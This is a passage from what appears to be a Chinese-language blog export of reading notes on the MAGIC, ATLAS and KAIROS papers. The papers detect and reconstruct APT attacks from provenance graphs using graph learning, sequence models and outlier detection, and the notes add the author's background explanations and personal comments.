$是通过计算掩码节点的初始嵌入和重建嵌入之间的缩放余弦损失获得的掩蔽特征重建损失。这种损失在简单样本和困难样本之间急剧增加，从而有效地加快了学习速度。这种缩放的程度由超参数γ控制。\n与此同时，基于样本的结构重建旨在重建图结构（即预测节点之间的边）。与重建整个邻接矩阵不同，后者具有O(N2)的复杂度，基于样本的结构重建在节点对上应用对比采样，并预测这些节点对之间的边概率。仅非掩蔽节点参与结构重建。正样本是由所有非掩蔽节点之间的所有现有边构建的，负样本则是在那些没有现有边的节点对中进行采样构建的。\n使用简单的两层 MLP 重建节点对样本之间的边，为每个样本生成一个概率。在这些样本上，重建损失的形式为简单的二元交叉熵损失：\n其中 （n， n−） 和 （n， n+） 分别是负样本和正样本，ˆ N =N− e N 是一组非掩码节点。基于样本的结构重建仅对输出嵌入进行监督。我们没有使用点积，而是使用 MLP 来计算边缘概率，因为交互实体的行为不一定相似。此外，我们并没有强迫模型学习预测边缘概率。这种结构重构的功能是最大化抽象节点嵌入中包含的行为信息，以便一个简单的MLP足以将这些信息合并并解释为边缘概率。\n最终的目标函数 L = $L_fr$ + $L_sr$ 结合了 $L_fr$ 和 $L_sr$，并为图表示模块提供监督信号，使其能够以自监督的方式学习参数。\nDetection Module 基于图表示模块生成的输出嵌入，利用异常值检测方法以无监督方式进行APT检测。如前几节所述，此类嵌入以不同的粒度总结了系统行为。我们的检测模型的目标是识别恶意系统实体或状态，前提是仅对良性系统行为有先验的了解。如果通过图表示学习生成的嵌入在图中具有相似的交互行为，则它们的相应实体往往会形成聚类。因此，系统状态嵌入中的异常值表示不常见和可疑的系统行为。基于这样的洞见，我们开发了一种特殊的异常值检测方法来进行APT检测。\n在训练过程中，首先从训练来源图中抽象出良性输出嵌入。在这个阶段，检测模块所做的只是记住这些嵌入，并将它们组织在一个K-D树中[33]。经过训练后，检测模块通过三个步骤揭示异常值：k-最近邻搜索、相似度计算和过滤。给定目标嵌入，检测模块首先通过 K-D 树搜索获得其 k 最近邻。这样的搜索过程只需要 log（N） 时间，其中 N 是记忆训练嵌入的总数。然后，应用相似性准则来评估目标嵌入与其邻居的接近程度并计算异常分数。如果其异常分数高于超参数 θ，则目标嵌入被视为异常值，其相应的系统实体或系统状态为恶意。检测模块的示例工作流程形式化如下，使用欧几里得距离作为相似性准则：\n其中 $\\overline{dist}$ 是训练嵌入与其 k 最近邻之间的平均距离。在执行批处理日志级别检测时，检测模块会记住反映系统状态的良性系统状态嵌入，并检测新到达的来源图的系统状态嵌入是否为异常值。在执行系统实体级检测时，检测模块会记住指示系统实体行为的良性节点嵌入，并给定一个新到达的来源图，它会检测所有系统实体嵌入中的异常值。\nModel Adaption 为了使APT检测器在实际检测场景中有效运行，必须考虑概念漂移。当面对良性但以前未见过的系统行为时，MAGIC 会产生误报检测结果，这可能会误导后续应用程序（例如攻击调查和故事恢复）。最近的工作通过忘记过时的数据[10]或通过模型适应机制[18]将他们的模型拟合到良性系统变化来解决这个问题。MAGIC还集成了模型适应机制，以对抗概念漂移，并从安全分析师识别的误报中学习。与其他仅使用误报来重新训练模型的作品略有不同，MAGIC可以使用所有反馈进行重新训练。如前几节所述，MAGIC 中的图形表示模块以自监督的方式将系统实体编码为嵌入，而无需知道其标签。任何看不见的数据，包括那些true negative，都是图表示模块的宝贵训练数据，以增强其对看不见的系统行为的表示能力。\n检测模块只能通过良性反馈进行重新训练，以跟上系统行为的变化。而且随着它记住越来越多的良性反馈，它的检测效率会降低。为了解决这个问题，我们还在检测模块上实现了折扣机制。当记忆嵌入的数量超过一定数量时，随着新到达的嵌入被学习，最早的嵌入被简单地删除。我们提供模型适配机制作为概念漂移和看不见的系统行为的可选解决方案。建议通过将确认的假阳性样本提供给 MAGIC 的模型适应机制来使 MAGIC 适应系统变化。\nImplementation 我们在 Python 3.8 中使用了大约 3,500 行代码实现了 MAGIC。我们开发了几个日志解析器来应对不同格式的审计日志，包括 StreamSpot [34]、Camflow [35] 和 CDM [36]。来源图是使用图处理库 Networkx [37] 构建的，并以 JSON 格式存储。图形表示模块是通过 PyTorch [38] 和 DGL [39] 实现的。该检测模块是用Scikit-learn[40]开发的。对于MAGIC的超参数，特征重建损失中的比例因子γ设置为3，相邻变量k设置为10，学习率为0.001，权重衰减因子等于5×10−4。我们在实验中使用了 3 层图形编码器和 0.5 的掩码率。在批处理日志级别检测和实体级检测两种检测方案中，输出嵌入维度 d 是不同的。我们在批处理日志级别检测中使用 d 等于 256，在实体级检测中使用 和 an 等于 64 以减少资源消耗。检测阈值 θ 是通过对每个数据集分别进行的简单线性搜索来选择的。超参数可能有其他选择。我们将在稍后的评估部分演示这些超参数对 MAGIC 的影响。在我们的超参数分析中，d 是从 {16， 32， 64， 128， 256} 中选出的，l 是从 {1， 2， 3， 4} 中选出的，r 是从 {0.3， 0.5， 0.7} 中选出的。对于阈值 θ，在批处理日志级别检测中选择介于 1 和 10 之间。有关实体级检测，请参阅附录 D。\nEvaluation 我们使用来自各种系统审计软件的 131GB 审计日志来评估 MAGIC 的有效性和效率。我们首先描述了我们的实验设置（第 6.1 节），然后详细说明了 MAGIC 在不同场景中的有效性（第 6.2 节），进行误报分析并评估模型适应机制的有用性（第 6.3 节），并分析了 MAGIC 的运行时性能开销（第 6.4 节）。MAGIC的不同组件和超参数的影响在第6.5节中进行了分析。此外，附录 C 中还对我们的动机示例进行了详细的案例研究，以说明 MAGIC 的管道如何用于 APT 检测。这些实验在相同的设备设置下进行。\nExperimental Settings 我们评估了MAGIC在三个公共数据集上的有效性：StreamSpot数据集[21]，Unicorn Wget数据集[22]和DARPA Engagement 3数据集[20]。这些数据集在数量、来源和粒度方面各不相同。我们相信，通过在这些数据集上测试MAGIC的性能，我们能够将MAGIC与尽可能多的最先进的APT检测方法进行比较，并探索MAGIC的普遍性和适用性。我们对这三个数据集的详细说明如下。\nStreamSpot 数据集：StreamSpot数据集（见表1）是由StreamSpot[34]使用审计系统SystemTap [41]收集并公开的模拟数据集。StreamSpot 数据集包含 600 批次审计日志，用于监控 6 个独特场景下的系统调用。其中五个方案是模拟的良性用户行为，而攻击方案模拟的是偷渡式下载攻击。该数据集被认为是一个相对较小的数据集，由于没有提供日志条目和系统实体的标签，因此我们对 StreamSpot 数据集执行批量日志级别检测，类似于以前的工作 [10， 15， 17]。\nUnicorn Wget 数据集：Unicorn Wget数据集（见表1）包含Unicorn[10]设计的模拟攻击。具体来说，它包含 Camflow [35] 收集的 150 批日志，其中 125 批是良性的，其中 25 批包含供应链攻击。这些攻击被归类为隐形攻击，经过精心设计，其行为类似于良性系统工作流程，预计很难识别。这个数据集被认为是我们实验数据集中最难的，因为它的体积大，日志格式复杂，而且这些攻击的隐蔽性。与最先进的方法相同，我们在此数据集上执行批处理日志级别检测。\nDARPA E3 数据集：DARPA Engagement 3 数据集（见表 2）作为 DARPA 透明计算计划的一部分，在对抗性参与期间在企业网络中收集。利用不同漏洞的 APT 攻击 [20] 由红队进行，以泄露敏感信息。蓝队试图通过审核网络主机并对其执行因果关系分析来识别这些攻击。Trace、THEIA 和 CADETS 子数据集包含在我们的评估中。这三个子数据集总共包含 51.69GB 的审计记录，包含多达 6,539,677 个系统实体和 68,127,444 次交互。因此，我们评估了MAGIC的系统实体级检测能力，并解决了这些数据集的开销问题。\n对于不同的数据集，我们采用不同的数据集拆分来评估模型，并且我们仅使用良性样本进行训练。对于 StreamSpot 数据集，我们从 500 个良性日志中随机选择 400 个批次进行训练，其余批次进行测试，从而形成一个平衡的测试集。对于 Unicorn Wget 数据集，选择了 100 批良性日志进行训练，其余用于测试。对于 DARPA E3 数据集，我们使用与 ThreaTrace [17] 相同的真值标签，并根据其出现的顺序拆分日志条目。最早的 80% 日志条目用于训练，其余条目保留用于测试。在评估过程中，MAGIC在100个全局随机种子下的平均性能被报告为最终结果，因此实验结果可能包含系统实体/日志批次的分数。\nEffectiveness conclusion 我们推出了 MAGIC，这是一种普遍适用的 APT 检测方法，它以最高的效率运行，开销很小。MAGIC 利用掩码图表示学习从原始审计日志中对良性系统行为进行建模，并通过异常值检测方法执行多粒度 APT 检测。在各种检测场景下对三个广泛使用的数据集进行评估表明，MAGIC以低误报率和最小的计算开销取得了良好的检测结果。\n知识补充 多标签哈希 多标签哈希（Multi-Label Hashing）是一种用于解决多标签分类问题的技术。在多标签分类问题中，每个样本可以属于一个或多个类别，而不是单一的类别。\n哈希是一种将数据映射到固定长度的二进制编码的方法。多标签哈希技术将这种哈希方法应用于多标签分类问题，将样本的多个标签映射为固定长度的二进制编码，从而方便快速的类别检索和处理。\n以下是多标签哈希的一些关键思想和方法：\n1. 单一哈希方法 Bit-Vector Hashing：最简单的多标签哈希方法之一是将每个标签映射为二进制编码的位向量。例如，如果有5个类别，则可以用5位二进制编码来表示每个标签，如 [1, 0, 1, 1, 0]。 2. 多哈希方法 Binary Relevance：这种方法将每个标签独立地进行哈希处理。对于每个标签，都使用一个单独的哈希函数，将其映射为固定长度的二进制编码。这种方法简单直观，但可能导致标签之间的相关性被忽略。 Multiple Hashing：这种方法使用多个哈希函数，将每个标签映射为多个不同的二进制编码。这可以捕捉到标签之间的一些相关性，提高多标签哈希的性能。 3. 哈希函数的选择 局部敏感哈希（Locality Sensitive Hashing，LSH）：LSH 是一种常用的哈希方法，它能够使相似的样本在哈希空间中映射为相邻的编码。这有助于快速的近似最近邻（ANN）搜索，对于多标签分类中的相似性检索很有用。 Deep Learning Hashing：使用深度学习模型学习哈希函数也是一种常见的方法。例如，可以使用卷积神经网络（CNN）或循环神经网络（RNN）来学习将标签映射为二进制编码的函数。 4. 检索和评估 哈希编码检索：一旦对样本进行了哈希处理，可以使用快速的哈希编码检索技术来查找与查询标签最相似的样本。 评估指标：对于多标签哈希，常用的评估指标包括 Hamming Loss、Hamming Distance、Precision、Recall、F1 Score 等，用于衡量模型的分类准确性和性能。 多标签哈希方法可以提高对于多标签数据的处理效率和准确性，尤其在大规模的多标签数据集中具有很好的应用前景。\n图形掩蔽自编码器 \u0026ldquo;Graph Masked Autoencoders\u0026rdquo; 是一种用于图形数据的自编码器模型，旨在学习图形数据的低维度表示。\n这个模型的主要思想是结合了自编码器（Autoencoder）的概念和图形数据的结构。自编码器是一种无监督学习算法，用于学习数据的紧凑表示，并在重建时最大程度地保留原始数据的信息。\n\u0026ldquo;Graph Masked Autoencoders\u0026rdquo; 在这个基础上加入了一种“掩蔽”机制，用于处理图形数据。这个“掩蔽”机制的目的是在训练过程中限制模型只能看到部分图形数据，从而强制模型学习到更加泛化的图形特征表示。\n具体来说，训练过程包含以下步骤：\n掩蔽图形数据（Masking Graph Data）：模型会随机地将一些节点或边从输入图中“掩蔽”（即隐藏），使得模型在训练时只能看到部分图形数据。 编码器（Encoder）：掩蔽后的图形数据通过编码器部分进行编码，将其映射到一个低维度的特征表示空间。 解码器（Decoder）：然后，模型尝试从这个低维度表示中重构原始的图形数据。 通过这个过程，模型被迫学习到不同节点和边之间的潜在关系，以及如何在只看到部分数据时对图形数据进行有效的编码和解码。\n这种方法的优势在于它能够提高模型对图形数据的泛化能力。因为模型只能看到部分数据，它不会过度依赖于特定的节点或边，从而可以更好地处理未见过的图形数据。\n\u0026ldquo;Graph Masked Autoencoders\u0026rdquo; 的应用包括图形节点分类、图形重构、图形生成等任务。它是图神经网络（Graph Neural Networks）领域中的一种重要技术，用于学习和处理复杂的图形结构数据。\n概念漂移 概念漂移是指机器学习模型在应用于新数据时性能下降的现象。这种现象通常发生在训练模型的数据分布与新数据的分布不同时。具体来说，概念漂移可能会导致模型在新数据上的预测准确性降低。\n概念漂移可以分为几种不同类型：\n特征漂移（Feature Drift）：特征漂移是指输入特征的分布在训练数据和测试数据中不同的情况。例如，训练数据中的特征范围可能与测试数据中的范围不同，这会导致模型无法准确地泛化到新数据。 标签漂移（Label Drift）：标签漂移是指目标变量的分布在训练数据和测试数据中不同的情况。换句话说，模型在训练数据中学到的标签分布可能与实际数据中的标签分布不同，从而影响模型的性能。 概念漂移（Concept Drift）：概念漂移是指预测变量和目标变量之间的关系在时间或数据分布上发生变化。这种情况下，模型在训练时学到的规律可能在应用到新数据时不再适用。 概念漂移是机器学习应用中一个重要的挑战，因为它可能导致模型的预测性能下降，需要采取一些方法来处理。一些应对概念漂移的方法包括：\n在线学习（Online Learning）：使用新数据不断更新模型，使其能够适应新的数据分布。 监督漂移检测（Supervised Drift Detection）：监测模型在新数据上的表现，当性能下降时触发模型的重新训练。 集成学习（Ensemble Learning）：结合多个模型的预测结果，以减少概念漂移对整体性能的影响。 领域适应（Domain Adaptation）：通过调整模型或数据来使其适应新的数据分布。 处理概念漂移是一个活跃的研究领域，因为许多现实世界的应用场景中数据分布经常发生变化。\nK-D tree K-D 树（K-Dimensional Tree，K-Dimensional Binary Tree）是一种用于高效处理k维空间的数据结构，用于解决近似最近邻搜索（Approximate Nearest Neighbor Search）等问题。它是一种二叉树结构，用于对 k 维数据进行分割和组织，以便快速地搜索最近的邻居。\n我的想法 和之前看的ATLAS比较起来，通过mask和减小模型复杂度来实现降低开销，并且没有造成结果的损失。好像就没啥更吊的地方了吧？\n加了个监督学习的步骤\n嵌入阶段用了mask和图注意力网络的技术手段，能获得质量更高，多跳敏感的嵌入。\n通过检测时候通过KD树找到K个临近的embedding，然后通过相似性计算， 设立一个阈值来判断是否具有恶意。再用decoder来还原出embedding所对应的边或者节点\n","date":"2024-03-02T20:19:11+08:00","image":"http://localhost:1313/p/magic/MAGIC/1709702251187_hu9559009030255142066.png","permalink":"http://localhost:1313/p/magic/","title":"MAGIC"},{"content":"文章可以在这里获取\nintroduction APT攻击涉及长期的多个攻击步骤，其调查需要分析大量日志以确定其攻击步骤。因此提出ATLAS从现成的审计日志构建端到端攻击故事的框架。\nATLAS基于的观察：无论利用的漏洞和执行的有效载荷如何，不同的攻击可能具有相似的抽象攻击策略。\nATLAS利用因果关系分析、自然语言处理和机器学习技术的新颖组合来构建基于序列的模型，该模型从因果图中建立攻击和非攻击行为的关键模式。\n取证分析从多个主机、应用程序和网络接口收集各种审计日志。海量日志通常被离线分析或实时监控，以调试系统故障并识别复杂的威胁和漏洞。\n现有方法：\n从审计日志中构建因果依赖关系图，并使用查询系统来定位关键攻击阶段（例如，受损进程或恶意负载）。 扩展机器学习（ML）技术，从日志中提取特征/序列，以自动检测入侵和故障。 构建了通过事件关联发现不同日志事件之间关联的技术 这些方法在很大程度上无法精确定位关键攻击步骤，从而有效地突出端到端攻击故事。因此我们希望从审计日志中识别关键实体（节点），帮助网络分析师构建 APT 攻击的关键步骤。\nATLAS将自然语言处理 （NLP） 和深度学习技术集成到数据来源分析中，以识别攻击和非攻击序列。分为三个阶段\n处理系统日志并构建自己的优化因果依赖图 通过NLP技术从因果图中构建语义增强序列（时间戳事件） 学习表示攻击语义的基于序列的模型，这有助于在推理时恢复描述攻击故事的关键攻击实体。 ATLAS不会带来额外开销，不同的审计日志可以很容易地集成到 ATLAS 日志解析器中用来构建因果图并获得精确的序列和模型\n我们的方法基于：因果依赖关系图中不同攻击的关键步骤可能具有相似的模式。这些模式可以通过NLP技术（即词形还原和词嵌入）转换为序列，将攻击和非攻击实体之间各种变化形式的关系组合在一起。它为模型提供了具有不同因果关系的更深层次的记忆。，进而提高了序列模型从未知审计日志中识别攻击步骤的准确性。\n但是这样的方法面对以下三个挑战，相应的，ATLAS采取手段来应对：\n因果图通常庞大而复杂，这使得序列构建变得困难\u0026ndash;\u0026gt;采用定制化的图优化算法来降低图的复杂度 它需要一种方法来精确构建序列，以有效地模拟合法和可疑的活动\u0026ndash;\u0026gt;提出一种从事件中提取攻击模式序列的新技术 需要一种自动化方法来识别给定的攻击症状中的攻击事件\u0026ndash;\u0026gt;通过攻击症状进行攻击调查，以恢复攻击事件，帮助全面构建攻击故事。 总的来说，ATLAS做了\n引入了 ATLAS，这是一个用于攻击故事恢复的框架，它利用自然语言处理和基于序列的模型学习技术来帮助网络分析师从审计日志中恢复攻击步骤. 提出了一种新的序列表示，通过词形还原和词嵌入来抽象攻击和非攻击语义模式。这些序列使 ATLAS 能够构建一个有效的基于序列的模型，以识别构成攻击故事的攻击事件 我们在受控环境中通过其真实世界报告开发的 10 种现实 APT 攻击中验证了 ATLAS。结果表明，ATLAS能够高精度、最小开销地识别攻击故事的关键攻击条目。 Motivation and Definitions 整篇论文中设定了一种攻击场景：攻击者通过电子邮件向企业中的目标用户发送恶意Microsoft Word文件（contract.doc）。用户被欺骗使用 Firefox 从 Gmail 下载和打开 Word 文件。该文档包含一段恶意代码，该代码利用易受攻击的 Microsoft Word （winword.exe） 并发出 HTTPS 请求以下载恶意 Microsoft HTA 脚本 （template.hta）。此脚本执行恶意 Visual Basic 脚本 （maintenance.vbs），其中包含安装后门以泄露敏感文件的 PowerShell 命令。最后，攻击者横向移动到其他主机。\n调查这个场景通常从从审核日志中收集有关攻击的数据开始，例如系统事件、DNS 查询和浏览器事件。攻击调查工具通常以因果图（或来源图）的形式表示审核日志，该图用作取证工具，使安全调查人员能够执行根本原因分析，并更好地了解攻击的性质。大多数先前的研究将因果图中的攻击故事恢复为子图，其中该图中的节点和边与攻击症状具有因果关系。图 1 （a） 显示了由这些工具生成的示例攻击场景的因果关系图。红色虚线箭头表示从中启动攻击调查的警报事件（α，可疑网络连接），红色虚线矩形区域表示已恢复的攻击子图。\n但是即使应用了不同的图优化技术，这样的图仍然非常大，并且在实践中难以解释。这些工作很大程度上依赖于启发式或硬编码规则，这些规则的开发和维护非常耗时。领域知识专家需要不断更新这些规则，以涵盖新开发的攻击。而ATLAS只需要更多的攻击训练数据来学习新的攻击模式。\n其他人提出了基于异常的方法，该方法可以学习用户行为，并将任何偏离该行为的行为识别为异常。虽然基于异常的方法可以识别未知攻击，但随着用户行为随时间的变化，它们可能会出现许多误报。为了解决这个问题，ATLAS旨在学习攻击模式和用户行为，以确定两者之间的异同。\n与ATLAS类似，基于学习的方法使用ML算法从日志中对攻击事件进行建模。虽然这些方法可以有效地减少日志条目的数量，但仍需要大量的手动工作才能找到攻击事件的高级视图。为了解决这个问题，ATLAS调查旨在识别攻击关键实体（节点），使其能够自动识别相关攻击事件的子集。\nAPT攻击可以概括为从审计日志中获取的攻击阶段的时间序列， 例如图1（b）中所示的步骤1-14，类似于自然语言中描述的攻击步骤。这些攻击步骤通常适合在特定上下文中作为表示攻击语义的唯一序列，这可以与审核日志中的正常活动区分开来。\nATLAS 在推理时给定攻击症状节点（警报事件α包含的恶意 IP 地址），提取一组与症状节点关联的候选序列，并使用基于序列的模型来识别序列中的哪些节点参与了攻击。此后，它使用已识别的攻击节点来构建攻击故事，其中包括已识别的攻击节点的事件，从而使攻击调查更加简洁，更容易被调查人员解读。\n图 1 （c） 说明了 ATLAS 为激励示例恢复的攻击故事，其中包括示例攻击的完整关键攻击步骤。此过程大大减少了从大型因果图中进行攻击调查的手动工作，该图排除了对攻击没有影响的事件，并减少了调查大型因果图所需的时间。\ndefinition 因果图G：因果图是从审计日志中提取的数据结构，通常用于来源跟踪，指示主题（例如，流程）和对象（例如，文件或连接）之间的因果关系。因果图由节点组成，节点代表主体和客体，边缘连接，边缘代表主体和客体之间的动作（例如，读取或连接）。我们在这里考虑一个有向循环因果图，它的边缘从主体指向对象。\n实体e：实体是从因果图中提取的唯一系统主体或对象，在其中它表示为节点。我们考虑的实体包括进程、文件和网络连接（即IP地址和域名）\n邻域图。给定因果图，如果两个节点u和v通过一条边连接，则称它们为邻居。节点 n 的邻域是由节点 n 和连接相邻节点与节点 n 的边组成的 G 子图。类似地，给定一组节点 {n1,n2,\u0026hellip;,nn}，我们提取一个统一的邻域图，其中包括将它们连接到相邻节点的所有节点和边。\n事件：事件ε是一个四元组（src、action、dest、t），源 （src） 和目标 （dest） 是与动作相关的两个实体。t 是显示事件发生时间的事件时间戳。给定一个实体 e，可以从 e 邻域图中提取其事件，其中包括与 e 的邻居相关的所有操作。例如，给定一个实体Firefox.exe和一个邻域图，其中包含从节点 Firefox.exe 到节点 Word.doc 的操作 open 和时间戳 t，那么 （Firefox.exe， open， Word.doc， t） 是 Firefox 进程在时间 t 打开 Word 文件的事件\n序列：给定一个实体 e，可以从因果图中提取序列 S。序列 S 按时间顺序包括实体 e 的邻域图的所有事件，使得 S{e} ：= {ε1， ε2， . . . ， εn}。同样，如果给定一组实体，我们可以从它们的统一邻域图中提取一个包含所有事件的序列。\n图 2 （a） 说明了具有六个实体 {eA， eB， . . . ， eF} 的因果图。图 2 （b） 显示了 eB 的邻域图，其中包括节点 B、相邻节点 {A， C} 及其连接边 {EAB， EBC}。类似地，实体集 {eB， eC} 的邻域图包括节点 {A， B， C， D， E} 和边 {EAB， EBC， ECD， ECE}，如图 2 （b） 所示。实体 eB 的事件为 εAB =\u0026lt; eA， a1， eB， t1 \u0026gt; 和 εBC =\u0026lt; eB， a2， eC， t2 \u0026gt;如图 2 （c） 所示。图 2 （d） 显示了实体集 {eB， eC} 的事件序列。\nMethod 序列生成 首先从日志中提取出平台无关的因果图（图缩减）：\n消除攻击节点无法访问到的所有节点和边缘【这缩的有点狠啊】 从审计日志中构建具有非重复边的因果图，构建的因果图中不包含重复的边（边属性相同且首尾节点相同） 如果某些节点和边引用相同类型的事件，则 ATLAS 会合并它们，合成的边的时间戳按原始边中最早的。 构造序列：\n将因果图转换为标记为“攻击”或“非攻击”的序列，并将词形还原和选择性采样扩展到序列构造中，以有效地抽象攻击和非攻击模式，最后，使用词嵌入将序列转换为实数向量，并通过 LSTM 学习基于序列的模型。\n对于攻击节点：\n对于一个图中的攻击节点，构建攻击节点子集，子集节点数$\\geq$2，因此对于n个攻击节点的集合，有$\\sum_{i=2}^k C_n^i$个子集，这个方法在面对攻击节点数量很多的时候复杂度会爆炸，但是攻击者一般会为了隐藏而最小化攻击节点数量【这样每个攻击子图都得比较小才合适，怪不得图缩减缩得这么狠】。\n1、对于攻击实体中的每个实体，ATLAS提取其在攻击子图中的邻域图，即捕捉与攻击节点节点有因果关系的实体，2、从邻域图中获取按照时间戳排序的攻击事件。如果源节点或目标节点代表攻击实体，则事件被标记为攻击。3、最后，ATLAS 将提取的时间戳排序的攻击事件转换为序列，并在以下情况下将其标记为攻击：（a） 它仅包含攻击事件， （b）它包括实体子集的所有攻击事件。【还是在缩减，这样攻击序列理论上是最小的】\n对于非攻击节点：\n意义不是很大，主要学习攻击序列。同时，对于一个有k个攻击节点和k\u0026rsquo;个非攻击节点的因果图，会有$\\sum^{k}_{i=1} C^i_k.k'$(攻击节点的子集（子集节点数不必$\\geq$ 2)+非攻击节点的全集)。提取非攻击序列的方法和提取攻击序列的方法的1、2步骤一样，3、如果序列与任何提取的攻击序列不匹配，则 ATLAS 会将其标记为非攻击，否则，处理后的序列将被丢弃。\n下面这张图是例子\n序列还原 ATLAS使用词形还原化将序列转换为表示序列模式的广义文本，以便进行语义解释。\n表1显示了 ATLAS 用于抽象序列中的实体和操作的四种不同的词汇类型以及每种类型中的词汇。词汇表总共包括 30 个单词，能够将单词的屈折形式和派生形式简化为共同的基本形式。词汇根据单词的细粒度语义分为四种类型：进程、文件、网络和动作。\nATLAS解析每个序列，查找实体并将每个实体映射到相应的词汇表。词形还原过程后的序列被转换为“类似句子”的中间表示，其中包含广义序列模式的完整语义。\n我们注意到，在对序列进行词形还原后，可能会发生攻击和非攻击序列的意外重复。为了使用非重复序列训练模型，我们丢弃了所有与攻击序列重叠的非攻击序列，然后再将其传递到选择性序列采样\n选择性序列采样 构建的攻击和非攻击序列的数量可能不平衡。原因是日志条目中的攻击实体通常少于非攻击实体。例如，我们在通过分析审计日志进行评估时发现，攻击实体的平均数量为 61，而非攻击实体的平均数量约为 21K。为了平衡训练数据集，ATLAS首先对具有一定相似性阈值的非攻击序列进行欠采样。然后，使用过采样机制随机变异攻击序列，直到它们的总数达到相同数量。不能直接采取复制的过采样因为会造成过拟合。\n欠采样 通过Levenshtein Distance计算相似性，用80%作为阈值。复杂度为$O(n^2)$\n过采样 对于攻击序列，ATLAS会随机将一种词汇类型变异为另一种相同类型的词汇。\n序列学习 通过词表示嵌入将词形还原序列转换为表示序列模式的广义文本（30个词-\u0026gt;4type)【对……对吗？】，然后用了多种方法生成嵌入向量并在后文进行了比较。\n通过LSTM和CNN来进行序列学习\n攻击还原 遍历所有节点，来判断是否是攻击节点，O(n)复杂度。\n为了了识别未知的攻击实体，ATLAS首先从因果图中获取所有未知实体，构建只包含一个未知实体的子集。然后，ATLAS 将攻击实体附加到每个子集;因此，每个子集包含所有已知的攻击症状实体和一个未知实体。ATLAS 使用这些子集从因果图中提取序列，LSTM 模型用于通过预测分数预测每个序列是攻击还是非攻击。此过程通过检查这两个实体的时间顺序事件是否形成模型先前学习的攻击模式来识别未知实体是否与攻击症状实体密切相关。\nATLAS 攻击故事恢复的目标是从攻击调查阶段识别与已识别攻击实体关联的攻击事件。ATLAS提取已识别攻击实体的邻域图，并将所有包含的事件作为攻击事件获取。这些事件按其时间戳进一步排序，作为恢复的攻击故事。ATLAS 的有效性不受跨多个主机执行的攻击的影响，它只需要对来自单个主机的审计日志执行分析即可发现所有攻击实体\n工作亮点 新的图缩减方法来构建因果图 通过因果图生成序列用于学习（词型还原+词表示嵌入+过采样\u0026amp;欠采样) 我的想法 图缩减方法是没见过的，按照文章的结果，这种图缩减方法也很值得参考，一顿猛缩减可以导致每个小子图的学习代价比较小（或者说因为序列长度有限制吧？)。把图学习转成序列识别的方法很有意思，这样直接就不用使用图学习了。但是感觉他这个识别是否攻击节点计算量也不小，O(n)是n*100s感觉也没啥用啊？抽时间复现下看看。\n补充知识 屈折形式（Inflectional Forms）和派生形式（Derivational Forms） 屈折形式是指单词在不同语法环境下的形式变化，这种变化不改变单词的基本词义或词类。屈折形式主要用于表示语法信息，如时态、数、格、性、比较级等。\nwalk -\u0026gt; walked -\u0026gt; walking book -\u0026gt; books big -\u0026gt; bigger -\u0026gt; biggest 派生形式是通过添加前缀或后缀来改变单词的词性或基本词义，生成新的单词的过程。派生通常会改变单词的基本意义和/或词类。\nclear (清楚的) -\u0026gt; unclear (不清楚的) happy (形容词) -\u0026gt; happiness (名词) Levenshtein Distance Levenshtein Distance，也称为编辑距离（Edit Distance），是一种衡量两个字符串之间差异的度量方法。它计算将一个字符串转换为另一个字符串所需的最少单字符编辑操作次数，这些操作包括插入（insertion）、删除（deletion）和替换（substitution）。Levenshtein Distance广泛应用于文本处理、拼写检查、语音识别、DNA序列比对等领域。它可以帮助确定两个字符串的相似度，或者在搜索时提供近似匹配。\n{{ \u0026lt;heatmap\u0026gt; }}\n","date":"2024-03-02T20:16:17+08:00","image":"http://localhost:1313/p/atlas/ATLAS/1709635161753_hu15806149300298337907.png","permalink":"http://localhost:1313/p/atlas/","title":"ATLAS"},{"content":"导语 SP24\ndoi is here\nAbstract 溯源图是描述系统执行历史的结构化审计日志。最近的研究探索了多种技术来分析自动主机入侵检测的溯源图，特别关注高级持续威胁（APT）。通过筛选他们的设计文档，我们确定了推动基于溯源图的入侵检测系统 (PIDS) 开发的四个常见维度：范围（能否检测到渗透到应用程序边界的现代攻击？）、攻击不可知性（能否检测到新颖的攻击而无需攻击特征的先验知识？）、及时性（能否在主机系统运行时有效地监控主机系统？）以及攻击重建能力（能否从大型溯源图中提取攻击活动，以便系统管理员能够轻松理解并快速响应系统入侵？） 。我们提出了 KAIROS，这是第一个同时满足所有四个维度的需求的 PIDS，而现有方法至少牺牲了一个维度，并且难以实现可比的检测性能。 KAIROS 利用基于新型图神经网络的编码器-解码器架构，该架构可以学习溯源图结构变化的时间演化，以量化每个系统事件的异常程度。然后，基于这些细粒度信息，KAIROS 重建攻击足迹，生成紧凑的摘要图，准确描述系统审核日志流上的恶意活动。使用最先进的基准数据集，我们证明 KAIROS 优于以前的方法。\nsenario 来自DARPA E3-THEIA的溯源图的摘要，描述了一种攻击活动，由KAIROS自动生成。矩形、椭圆形和菱形分别表示进程、文件和套接字。R=读取，W=写入，O=打开，S=发送，Rc=接收，C=克隆，E=执行。为了清晰起见，我们添加了颜色和虚线元素，以突出显示 KAIROS 生成的输出。KAIROS从原始来源图中提取实体节点和边，以重建攻击。根据攻击地面真相，虚线粉红色节点和边缘是 KAIROS 错过的与攻击相关的活动。蓝色节点和边是基本事实中未明确提及但包含在 KAIROS 中的活动。\nchallenge 不可知性：有没见过的攻击，需要模型具有泛化性 攻击重建：很难通过溯源图得到并重现完整的攻击流程 及时性：作为入侵检测系统（IDS)需要及时性，这就要求模型性能比较高 Method KAIROS是一个基于异常的入侵检测和攻击调查系统。它通过来源图中的因果依赖关系，利用最先进的深度图学习和社区发现， 可以做到\n在事先不了解任何特定攻击特征的情况下检测异常系统行为。 根据信息流关联检测到的异常内核对象之间。 KAIROS 提供简洁且有意义的摘要图表，用于节省人力的人机交互取证分析。 下图描述了KAIROS的架构，由四个主要组件组成：\n图的构建和表示。 KAIROS以流式传输方式分析图表，按时间顺序摄取图表中出现的边。KAIROS 考虑三种类型的内核对象和九种类型的交互（即系统事件）。 KAIROS 将每个事件转换为有向、带时间戳的边，其中源节点代表事件的主体，目标节点代表所作用的对象。使用基于节点属性的分层特征哈希技术对节点的特征进行编码（但是感觉是先层次花，再用FeatureHasher，感觉也没有多次hash，而且他的形式化表达里映射正负的$\\mathcal{H}$也没看到啊。)\n图学习。 当图中出现新的边缘，KAIROS 